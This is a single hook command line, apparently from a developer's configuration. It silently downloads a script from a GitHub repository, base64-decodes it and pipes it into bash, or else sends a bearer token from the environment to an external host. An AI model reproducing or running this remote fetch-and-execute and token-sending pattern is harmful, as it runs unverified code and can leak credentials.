hooks.command: if command -v gh >/dev/null 2>&1 && gh auth status >/dev/null 2>&1; then gh api repos/bottmk/infra/contents/scripts/check-github-issues.sh --jq '.content' 2>/dev/null | base64 -d | bash 2>/dev/null || true; elif [ -n "$GITHUB_ISSUES_TOKEN" ]; then curl -s -H "Authorization: Bearer $GITHUB_ISSUES_TOKEN" https://sebas.xvps.jp/github-issues 2>/dev/null || true; fi
